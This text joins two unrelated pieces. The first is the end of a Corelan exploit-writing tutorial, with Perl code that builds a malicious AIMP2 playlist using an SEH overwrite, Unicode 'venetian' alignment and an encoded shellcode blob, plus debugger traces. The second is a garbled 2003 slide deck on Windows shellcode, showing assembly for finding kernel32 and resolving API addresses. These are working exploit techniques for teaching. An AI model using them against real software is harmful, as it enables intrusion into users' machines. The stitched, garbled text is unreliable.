02 00 00 00  .........0E.....\n0012d9d4  01 00 00 00 00 00 13 00-3f 00 01 00 00 00 00 00  ........?.......\n0012d9e4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n0012d9f4  00 00 00 00 72 12 ff ff-00 30 ff ff ff ff ff ff  ....r....0......\n0012da04  20 53 84 74 1b 00 5b 05-28 ad 38 00 23 00 ff ff   S.t..[.(.8.#...\n0:000> d 0012fda0\n0012fda0  41 00 6d 00 0e 00 45 00-42 00 42 00 42 00 42 00  A.m...E.B.B.B.B.\n0012fdb0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdc0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdd0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fde0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fdf0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fe00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fe10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\nThe 4th address brings us close to our B\u2019s.  So what we need to do is\nput the 4th address in eax, and increase it just a little, so it points\nto a location where we can put our shellcode.\nGetting the 4th address is as simple as doing 4 pop\u2019s in a row. So if\nyou would do pop eax, pop eax, pop eax, pop eax, then the last \u201cpop\neax\u201d will take the 4th address from esp.  In venetian shellcode, this\nwould be :\nmy $align = \"\\x58\"; #pop  eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\nWe\u2019ll increase eax just a little.  The smallest amount we can add\neasily is 100, which can be done using the following code :\n#now increase the address in eax so it would point to our buffer\n$align = $align.\"\\x05\\x02\\x11\";   #add eax,11000200\n$align=$align.\"\\x6d\";   #align\/nop\n$align=$align.\"\\x2d\\x01\\x11\";   #sub eax,11000100\n$align=$align.\"\\x6d\";   #align\/nop\nFinally, we\u2019ll need to jump to eax :\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\nAfter the jump, we\u2019ll put B\u2019s.  Let\u2019s see if we can jump to the B\u2019s :\nCode :\nmy $header = \"\\nNumberOfEntries=1\\n\\n\";\n$header=$header.\"File1=\";\nmy $junk=\"A\" x 4065;\nmy $seh=\"\\x41\\x6d\";   # inc ecx + add byte ptr [ebp],ch\nmy $nseh=\"\\x0e\\x45\";  #0045000E  aimp2.dll\n#good stuff on the stack, we need 4th address\nmy $align = \"\\x58\"; #pop  eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n#now increase the address in eax so it would point to our buffer\n$align = $align.\"\\x05\\x02\\x11\";   #add eax,11000200\n$align=$align.\"\\x6d\";   #align\/nop\n$align=$align.\"\\x2d\\x01\\x11\";   #sub eax,11000100\n$align=$align.\"\\x6d\";   #align\/nop\n#jump to eax now\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\n#put in 1000 Bs\nmy $rest=\"B\" x 1000;\nmy $payload=$header.$junk.$seh.$nseh.$align.$jump.$rest.\"\\n\";\nopen(myfile,'>aimp2sploit.pls');\nprint myfile $payload;\nprint \"Wrote \" . length($payload).\" bytes\\n\";\nclose(myfile);\nResult :\neax=0012fda0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdb8 esp=0012d8f0 ebp=0012d9c0 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200286\n+0x12fda7:\n0012fdb8 0500020011      add     eax,offset bass+0x200 (11000200)\n0:000>\neax=1112ffa0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdbd esp=0012d8f0 ebp=0012d9c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12fdac:\n0012fdbd 006d00          add     byte ptr [ebp],ch          ss:0023:0012d9c0=ff\n0:000>\neax=1112ffa0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdc0 esp=0012d8f0 ebp=0012d9c0 iopl=0         nv up ei pl nz ac po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200213\n+0x12fdaf:\n0012fdc0 2d00010011      sub     eax,offset bass+0x100 (11000100)\n0:000>\neax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdc5 esp=0012d8f0 ebp=0012d9c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12fdb4:\n0012fdc5 006d00          add     byte ptr [ebp],ch          ss:0023:0012d9c0=31\n0:000> d eax\n0012fea0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012feb0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fec0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fed0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fee0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012fef0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012ff00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0012ff10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.\n0:000> t\neax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdc8 esp=0012d8f0 ebp=0012d9c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12fdb7:\n0012fdc8 50              push    eax\n0:000> t\neax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdc9 esp=0012d8ec ebp=0012d9c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\n+0x12fdb8:\n0012fdc9 006d00          add     byte ptr [ebp],ch          ss:0023:0012d9c0=63\n0:000> t\neax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fdcc esp=0012d8ec ebp=0012d9c0 iopl=0         ov up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200a86\n+0x12fdbb:\n0012fdcc c3              ret\n0:000> t\neax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000\neip=0012fea0 esp=0012d8f0 ebp=0012d9c0 iopl=0         ov up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200a86\n+0x12fe8f:\n0012fea0 42              inc     edx\nOk, we got eax to point at our B\u2019s, and we have made a succesful jump.\nNow we need to place our shellcode at 0x0012fea0. We can do this by\nadding some padding between the jump and the begin of the shellcode.\nAfter doing a little bit of math, we can calculate that we need 105\nbytes.\nCode :\nmy $header = \"\\nNumberOfEntries=1\\n\\n\";\n$header=$header.\"File1=\";\nmy $junk=\"A\" x 4065;\nmy $seh=\"\\x41\\x6d\";   # inc ecx + add byte ptr [ebp],ch\nmy $nseh=\"\\x0e\\x45\";  #0045000E  aimp2.dll\n#good stuff on the stack, we need 4th address\nmy $align = \"\\x58\"; #pop  eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n$align=$align.\"\\x58\";  #pop eax\n$align=$align.\"\\x6d\";\n#now increase the address in eax so it would point to our buffer\n$align = $align.\"\\x05\\x02\\x11\";   #add eax,11000200\n$align=$align.\"\\x6d\";   #align\/nop\n$align=$align.\"\\x2d\\x01\\x11\";   #sub eax,11000100\n$align=$align.\"\\x6d\";   #align\/nop\n#jump to eax now\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\n#add some padding\nmy $padding=\"C\" x 105;\n#eax points at shellcode\nmy $shellcode=\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARA\".\n\"LAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZA\".\n\"BABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB\".\n\"KLK8U9M0M0KPS0U99UNQ8RS44KPR004K22LLDKR2MD4KCBMX\".\n\"LOGG0JO6NQKOP1WPVLOLQQCLM2NLMPGQ8OLMM197K2ZP22B7\".\n\"TK0RLPTK12OLM1Z04KOPBX55Y0D4OZKQXP0P4KOXMHTKR8MP\".\n\"KQJ3ISOL19TKNTTKM18VNQKONQ90FLGQ8OLMKQY7NXK0T5L4\".\n\"M33MKHOKSMND45JBR84K0XMTKQHSBFTKLL0KTK28MLM18S4K\".\n\"KT4KKQXPSYOTNDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM\".\n\"2JKQTMSU89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU\".\n\"7MEMKOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC\".\n\"QQ2LRCM0LJA\";\n#more stuff\nmy $rest=\"B\" x 1000;\nmy $payload=$header.$junk.$seh.$nseh.$align.$jump.$padding.$shellcode.$rest.\"\\n\"\n;\nopen(myfile,'>aimp2sploit.pls');\nprint myfile $payload;\nprint \"Wrote \" . length($payload).\" bytes\\n\";\nclose(myfile);\nResult (using some breakpoints, we look at eax just before the call to\neax is made) :\n0:000> d eax\n0012fea0  50 00 50 00 59 00 41 00-49 00 41 00 49 00 41 00  P.P.Y.A.I.A.I.A.\n0012feb0  49 00 41 00 49 00 41 00-51 00 41 00 54 00 41 00  I.A.I.A.Q.A.T.A.\n0012fec0  58 00 41 00 5a 00 41 00-50 00 41 00 33 00 51 00  X.A.Z.A.P.A.3.Q.\n0012fed0  41 00 44 00 41 00 5a 00-41 00 42 00 41 00 52 00  A.D.A.Z.A.B.A.R.\n0012fee0  41 00 4c 00 41 00 59 00-41 00 49 00 41 00 51 00  A.L.A.Y.A.I.A.Q.\n0012fef0  41 00 49 00 41 00 51 00-41 00 50 00 41 00 35 00  A.I.A.Q.A.P.A.5.\n0012ff00  41 00 41 00 41 00 50 00-41 00 5a 00 31 00 41 00  A.A.A.P.A.Z.1.A.\n0012ff10  49 00 31 00 41 00 49 00-41 00 49 00 41 00 4a 00  I.1.A.I.A.I.A.J.\n0:000> d\n0012ff20  31 00 31 00 41 00 49 00-41 00 49 00 41 00 58 00  1.1.A.I.A.I.A.X.\n0012ff30  41 00 35 00 38 00 41 00-41 00 50 00 41 00 5a 00  A.5.8.A.A.P.A.Z.\n0012ff40  41 00 42 00 41 00 42 00-51 00 49 00 31 00 41 00  A.B.A.B.Q.I.1.A.\n0012ff50  49 00 51 00 49 00 41 00-49 00 51 00 49 00 31 00  I.Q.I.A.I.Q.I.1.\n0012ff60  31 00 31 00 31 00 41 00-49 00 41 00 4a 00 51 00  1.1.1.A.I.A.J.Q.\n0012ff70  49 00 31 00 41 00 59 00-41 00 5a 00 42 00 41 00  I.1.A.Y.A.Z.B.A.\n0012ff80  42 00 41 00 42 00 41 00-42 00 41 00 42 00 33 00  B.A.B.A.B.A.B.3.\n0012ff90  30 00 41 00 50 00 42 00-39 00 34 00 34 00 4a 00  0.A.P.B.9.4.4.J.\n0:000> d\n0012ffa0  42 00 4b 00 4c 00 4b 00-38 00 55 00 39 00 4d 00  B.K.L.K.8.U.9.M.\n0012ffb0  30 00 4d 00 30 00 4b 00-50 00 53 00 30 00 55 00  0.M.0.K.P.S.0.U.\n0012ffc0  39 00 39 00 55 00 4e 00-51 00 38 00 52 00 53 00  9.9.U.N.Q.8.R.S.\n0012ffd0  34 00 34 00 4b 00 50 00-52 00 30 00 30 00 34 00  4.4.K.P.R.0.0.4.\n0012ffe0  4b 00 32 00 32 00 4c 00-4c 00 44 00 4b 00 52 00  K.2.2.L.L.D.K.R.\n0012fff0  32 00 4d 00 44 00 34 00-4b 00 43 00 42 00 4d 00  2.M.D.4.K.C.B.M.\n00130000  41 63 74 78 20 00 00 00-01 00 00 00 9c 24 00 00  Actx ........$..\n00130010  c4 00 00 00 00 00 00 00-20 00 00 00 00 00 00 00  ........ .......\nThis seems to be ok\u2026 or not  ?  Look closer\u2026 It looks like  our\nshellcode is too big. We attempted to write beyond 00130000 and that\ncuts off our shellcode.  So it looks like we cannot place our shellcode\nafter overwriting the SEH record.  The shellcode is too big (or our\navailable buffer space is too small)\n. . .\nI could have continued the tutorial, explaining how to finalize this\nexploit, but I\u2019m not going to do it. Use your creativity and see if you\ncan build the exploit yourself.  You can ask questions in my [79]forum,\nand I\u2019ll try to answer all questions (without giving away the solution\nright away of course).\nI\u2019ll post the working exploit on my blog later on.\nJust to prove that building a working exploit is possible :\nAs usual, If you have questions\/remarks\/\u2026 about this and other\nexploitation techniques, don\u2019t hesitate to log in, visit our forum &\ndrop your questions :\n[80]https:\/\/www.corelan.be\/index.php\/forum\/writing-exploits\/\nThanks to\n\u2013 D-Null and Edi Strosar, for supporting me throughout the process of\nwriting this tutorial\n\u2013 D-Null, Edi Strosar, CTF Ninja, FX  for proof-reading this tutorial\u2026\nYour comments & feedback were a big help & really valuable to me !\nFinally\nIf you build your own exploits \u2013 don\u2019t forget to send your greetz to me\n(corelanc0d3r) :-)\n\u00a9 2009 \u2013 2021, [81]Peter Van Eeckhoutte (corelanc0d3r). All rights\nreserved.\nSimilar\/Related posts:\n[82]Default Thumbnail Exploit writing tutorial part 8 : Win32 Egg\nHunting [83]Default Thumbnail Exploit writing tutorial part 3b : SEH\nBased Exploits \u2013 just another example [84]Default Thumbnail Exploit\nwriting tutorial part 9 : Introduction to Win32 shellcoding [85]Default\nThumbnail Exploit writing tutorial part 5 : How debugger modules &\nplugins can speed up basic exploit development [86]Default Thumbnail\nExploit writing tutorial part 3 : SEH Based Exploits\nPosted in [87]001_Security, [88]Exploit Writing Tutorials, [89]Exploits\n| Tagged [90]00410041, [91]0x00410041, [92]0x06, [93]0xeb, [94]alpha2,\n[95]BufferRegister, [96]Building IA32 'Unicode-Proof' Shellcodes,\n[97]chris anley, [98]code page, [99]Creating Arbitrary Shellcode in\nUnicode Expanded string, [100]dave aitel, [101]decoder, [102]eax,\n[103]eip, [104]exploit, [105]fx, [106]msfencode,\n[107]MultiByteToWideChar, [108]nseh, [109]null bytes, [110]ollyuni,\n[111]prepend, [112]pvefindaddr, [113]seh, [114]shellcode,\n[115]skylined, [116]unicode, [117]unicode jump seh, [118]utf-16,\n[119]utf-7, [120]utf-8, [121]venetian, [122]vense.pl\n28 Responses to Exploit writing tutorial part 7 : Unicode \u2013 from 0x00410041\nto calc\nPingback: [123]Recognize-Security | Peter Van Eeckhoutte\u2019s Exploit\nWriting Tutorials\n____________________ Search\nCorelan Training\nWe have been teaching our win32 exploit dev classes at various security\ncons and private companies & organizations since 2011\nCheck out our schedules page [124]here and sign up for one of our\nclasses now!\nDonate\nWant to support the Corelan Team community ? [125]Click here to go to\nour donations page.\nWant to donate BTC to Corelan Team?\n[donate_btc_to_corelan_thumb.png]\nYour donation will help funding server hosting.\n[INS: :INS]\nCorelan Team Merchandise\nYou can support Corelan Team by donating or purchasing items from\n[126]the official Corelan Team merchandising store.\n[127]Protected by Copyscape Web Plagiarism Tool\nCorelan on Slack\nYou can chat with us and our friends on our Slack workspace:\nGo to [128]our facebook page\nBrowse through the posts and find the invite to Slack\nUse the invite to access our Slack workspace\nActions\n* [129]Log in\n* [130]Entries feed\n* [131]Comments feed\n* [132]WordPress.org\nCategories\nCategories[Select Category_____________]\nMastodon: [133]@corelanc0d3r | [134]@corelan\nCopyright Peter Van Eeckhoutte \u00a9 2007 - 2024 | All Rights Reserved |\n[135]Terms of use\n7ads6x98y\nHi there!\nDo you like our free content? Enjoying the materials we put together?\nAre you interested in learning how to write exploits for Windows, but\nperhaps looking for updated materials?\nAre you struggling to fully grasp the concepts based on what you find\nonline? Would you perhaps prefer to learn in a classroom setting\ninstead?\nWe have good news for you!\nDid you know that we travel to strategic places around the world, to\nteach our world-renowned exploit development classes.\nIn order to preserve and ensure a top-quality learning experience, all\nof our classes are delivered in-person.\nI also teach private classes! For larger groups, I\u2019ll glady come to\nyou. For smaller groups, willing to travel to Belgium,  I\u2019ll provide a\ntraining room near Bruges.\nWe currently offer 2 classes:\nOur \u201c[136]Bootcamp\u201d classes covers the basics of exploit development\nfor Windows 11.\nThe \u201c[137]Advanced\u201d class covers heap exploitation for Windows 7,\nWindows 10 and Windows 11.\nBoth classes contain a short introduction on x64 exploitation!\nYou can find our schedules here:\n[138]https:\/\/www.corelan-training.com\/index.php\/training-schedules .\n>>> Our classes tend to sell out fast, so sign up today and secure\nyour seat in one of our classes !! <<<\nAnd if you\u2019re not sure \u2013 [139]feel free to check what our students have\nto say about our classes.\nEnjoy!\n(BUTTON) X\nWe are using cookies to give you the best experience on our website.\nYou can find out more about which cookies we are using or switch them\noff in (BUTTON) settings.\n(BUTTON) Accept\n(BUTTON) Change cookie settings\n(BUTTON) Close GDPR Cookie Settings\n* (BUTTON) Privacy Overview\n* (BUTTON) Strictly Necessary Cookies\n* (BUTTON) Cookie Policy\nPrivacy Overview\na. Corelan respects your privacy. Most information accessible on or via\nthe\nCorelan Website is available without the need to provide personal\ninformation.\nIn certain cases you may however be requested to submit personal\ninformation. In\nsuch case your personal information shall be treated in accordance with\nthe General Data Protection Regulation and any amendments hereof.\nb. All personal information made available by you will be treated\nsolely for\nthe purpose of making available to you the requested information or\nservices.\nYour personal information will not be shared with third parties, but it\nmay be used for authentication, support & marketing purposes in\nrelation with services provided by Corelan.\nc. We will only keep your personal information for as long as is\nrequired to\nprovide you with the requested information or services, or for any\nlonger period\nas may legally be required.\nd. It is our goal to reasonably protect the personal information made\navailable by you from third parties.\ne. You have the right to consult, correct, adjust or have removed your\npersonal details by written request to Corelan.  If you decide to get\nyour information removed, you understand and accept that you will lose\nall access to any resources that require the use of these personal\ndetails, such as parts of the website that require authentication.\nf. When using the Corelan Website, cookies may possible be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of Corelan Websites. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser.\nWhen you log in, we will also set up several cookies to save your login\ninformation and your screen display choices.   Cookies may be used to\ndisplay advertisements or to collect statistics about the use of the\nCorelan website.\ng. This privacy policy may be amended by Corelan at any time.\nStrictly Necessary Cookies\nStrictly Necessary Cookie should be enabled at all times so that we can\nsave your preferences for cookie settings.\nEnable or Disable Cookies [ ]\nIf you disable this cookie, we will not be able to save your\npreferences. This means that every time you visit this website you will\nneed to enable or disable cookies again.\nCookie Policy\nWhen using the Corelan Website, cookies may possibly be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of the Corelan Website. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser. When you log in, we will also set up\nseveral cookies to save your login information and your screen display\nchoices.\nWe may use third party cookies to show ads and to collect anonymous\ninformation such as the number of visitors to the site, and the most\npopular pages.  The ability to show ads is an important source of\nincome to cover the hosting fees to keep this website alive. If you\nprevent ads from being displayed, this website will eventually\ndisappear.\nThird party vendors, including Google, use cookies to serve ads based\non a user's prior visits to this website or other websites.\nGoogle's use of advertising cookies enables it and its partners to\nserve ads to your users based on their visit to this site and\/or other\nsites on the Internet.\n(BUTTON) Enable All (BUTTON) Save Changes"}
{"text":"W\nW\nW\nWi\ni\ni\nin\nn\nn\nn3\n3\n3\n32\n2\n2\n2 O\nO\nO\nOn\nn\nn\nne\ne\ne\ne-\n-\n-\n-W\nW\nW\nWa\na\na\nay\ny\ny\ny\nS\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\nW\nW\nW\nWi\ni\ni\nin\nn\nn\nn3\n3\n3\n32\n2\n2\n2 O\nO\nO\nOn\nn\nn\nne\ne\ne\ne-\n-\n-\n-W\nW\nW\nWa\na\na\nay\ny\ny\ny\nS\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\nBuilding Firewall-proof shellcode\nBlack Hat Briefing Asia 2003\nsk@scan-associates.net\nCo-founder, Security Consultant, Software\nArchitect\nScan Associates Sdn Bhd\n\fO\nO\nO\nOv\nv\nv\nve\ne\ne\ner\nr\nr\nrv\nv\nv\nvi\ni\ni\nie\ne\ne\new\nw\nw\nw\n\u2022 Introduction\n\u2013 Windows Shellcode Skeleton\n\u2013 Bind to port\n\u2013 Reverse connect\n\u2022 One-way Shellcode\n\u2013 Find socket\n\u2013 Reuse socket\n\u2013 Rebind socket\n\u2013 Other One-way\n\u2022 Transferring file\n\u2022 End of shellcode?\n\fI\nI\nI\nIn\nn\nn\nnt\nt\nt\ntr\nr\nr\nro\no\no\nod\nd\nd\ndu\nu\nu\nuc\nc\nc\nct\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn t\nt\nt\nto\no\no\no S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n(\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 An exploit consist of two major parts:\n\u2013 Exploitation Technique\n\u2013 Payload\n\u2022 The objective of the exploitation part is to divert\nthe execution path:\n\u2013 Stack-based Buffer Overflow\n\u2013 Heap-based Buffer Overflow\n\u2013 Format String\n\u2013 Integer Overflow, etc.\n\u2022 Exploitation technique are varies and\ndependant to specific vulnerability\n\fI\nI\nI\nIn\nn\nn\nnt\nt\nt\ntr\nr\nr\nro\no\no\nod\nd\nd\ndu\nu\nu\nuc\nc\nc\nct\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn t\nt\nt\nto\no\no\no S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n(\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\n\u2022 Payload allows arbitrary code execution\n\u2022 Shellcode is a payload that will spawn you a\nshell, which in turn allows interactive command\nexecution\n\u2022 Unlike Exploitation Technique, a well designed\nshellcode can easily be reused in others\nexploits\n\u2022 Basic requirements: a shell and a connection\n\fW\nW\nW\nWh\nh\nh\nhy\ny\ny\ny S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne?\n?\n?\n?\n\u2022 Discover internal network to further penetrate\ninto other computers\n\u2013 net view \/domain\n\u2022 Upload\/download file\/database\n\u2022 Install trojan, key logger, sniffer, enterprise\nworm, WinVNC, etc.\n\u2022 Restart vulnerable service\n\u2022 Cleaning up trace\n\u2022 Etc.\n\fW\nW\nW\nWi\ni\ni\nin\nn\nn\nnd\nd\nd\ndo\no\no\now\nw\nw\nws\ns\ns\ns S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\nS\nS\nS\nSk\nk\nk\nke\ne\ne\nel\nl\nl\nle\ne\ne\net\nt\nt\nto\no\no\non\nn\nn\nn\n\u2022 Getting EIP\n\u2022 Decoder\n\u2022 Getting addresses of required functions\n\u2022 Setup socket\n\u2022 Spawning shell\n\fG\nG\nG\nGe\ne\ne\net\nt\nt\ntt\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng E\nE\nE\nEI\nI\nI\nIP\nP\nP\nP\n\u2022 Useful to know where you are (EIP)\n\u2022 To get EIP, we can CALL a procedure and POP it\nfrom the stack before return\n450000:\nlabel1: pop eax\n450005: \u2026 (eax = 451005)\n451000: call label1\n451005:\n450000: jmp label1\n450002:\nlabel2: jmp cont\n450004:\nlabel1: call label2\n450009:\ncont: pop eax\n\u2026 (eax = 450009)\n\fD\nD\nD\nDe\ne\ne\nec\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ner\nr\nr\nr\n\u2022 Buffer overflow usually will not allow NULL and\nsome special characters\n\u2022 Shellcode can encode itself using XOR to prevent\nthese special characters\n\u2022 During execution, a decoder will translate the rest\nof the code back to opcode\nxor ecx, ecx\nmov cl, 0C6h ;size\nloop1:\ninc eax\nxor byte ptr [eax], 96h\nloop loop1\n\fG\nG\nG\nGe\ne\ne\net\nt\nt\ntt\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng A\nA\nA\nAd\nd\nd\ndd\nd\nd\ndr\nr\nr\nre\ne\ne\nes\ns\ns\nss\ns\ns\ns o\no\no\nof\nf\nf\nf R\nR\nR\nRe\ne\ne\neq\nq\nq\nqu\nu\nu\nui\ni\ni\nir\nr\nr\nre\ne\ne\ned\nd\nd\nd\nF\nF\nF\nFu\nu\nu\nun\nn\nn\nnc\nc\nc\nct\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\n\u2022 Locate address of any Win32 API via\nGetProcAddress()\n\u2022 We can locate address of GetProcAddress()\nfrom KERNEL32.DLL in the memory\n\u2022 Default KERNEL32.DLL base memory:\n\u2013 NT \u2013 0x77f00000\n\u2013 2kSP2 & SP3 \u2013 0x77e80000\n\u2013 WinXP - 0x77e60000\n\u2022 KERNEL32.DLL starts with \u201cMZ\\x90\u201d, the\nstrategy is to loop backward from 0x77f00000\nto find \u201c\\x90ZM\u201d\n\fL\nL\nL\nLo\no\no\noc\nc\nc\nca\na\na\nat\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng K\nK\nK\nKe\ne\ne\ner\nr\nr\nrn\nn\nn\nne\ne\ne\nel\nl\nl\nl3\n3\n3\n32\n2\n2\n2 B\nB\nB\nBa\na\na\nas\ns\ns\nse\ne\ne\ne\nM\nM\nM\nMe\ne\ne\nem\nm\nm\nmo\no\no\nor\nr\nr\nry\ny\ny\ny\n\u2022 A better way to locate Kernel32 base memory\nmov eax,fs:[30h] ; PEB base\nmov eax,[eax+0ch] ; goto PEB_LDR_DATA\nmov esi,[eax+1ch] ; first entry in\n; InInitializationOrderModuleList\nlodsd ; forward to next LIST_ENTRY\nmov ebx,[eax+08h] ; Kernel32 base memory\n\fG\nG\nG\nGe\ne\ne\net\nt\nt\ntt\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng G\nG\nG\nGe\ne\ne\net\nt\nt\ntP\nP\nP\nPr\nr\nr\nro\no\no\noc\nc\nc\ncA\nA\nA\nAd\nd\nd\ndd\nd\nd\ndr\nr\nr\nre\ne\ne\nes\ns\ns\nss\ns\ns\ns(\n(\n(\n()\n)\n)\n)\n(\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Obtain GetProcAddress() from Export Table in\nKernel32\n\u2013 Locate Export Name Table\n\u2013 Loop to find \u201cGetProcAddress\u201d\n\u2013 Get Ordinal and calculate the address\nmov esi,dword ptr [ebx+3Ch] ;to PE Header\nadd esi,ebx\nmov esi,dword ptr [esi+78h] ;to export table\nadd esi,ebx\nmov edi,dword ptr [esi+20h] ;to export name table\nadd edi,ebx\nmov ecx,dword ptr [esi+14h] ;number of exported function\npush esi\nxor eax,eax\n\fG\nG\nG\nGe\ne\ne\net\nt\nt\ntt\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng G\nG\nG\nGe\ne\ne\net\nt\nt\ntP\nP\nP\nPr\nr\nr\nro\no\no\noc\nc\nc\ncA\nA\nA\nAd\nd\nd\ndd\nd\nd\ndr\nr\nr\nre\ne\ne\nes\ns\ns\nss\ns\ns\ns(\n(\n(\n()\n)\n)\n)\n(\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\n\u2022 ProcAddr = (((counter * 2) + Ordinal) * 4) +\nAddrTable + Kernel32Base\nmov edx,dword ptr [esi+24h] ;to Export Ordinals\nadd edx,ebx\nshl eax,1 ;count * 2\nadd eax,edx ;count + Export Ordinals\nxor ecx,ecx\nmov cx,word ptr [eax]\nmov eax,dword ptr [esi+1Ch] ;to Export Addr\nadd eax,ebx\nshl ecx,2 ;count * 4\nadd eax,ecx ;count + Export Addr\nmov edx,dword ptr [eax]\nadd edx,ebx 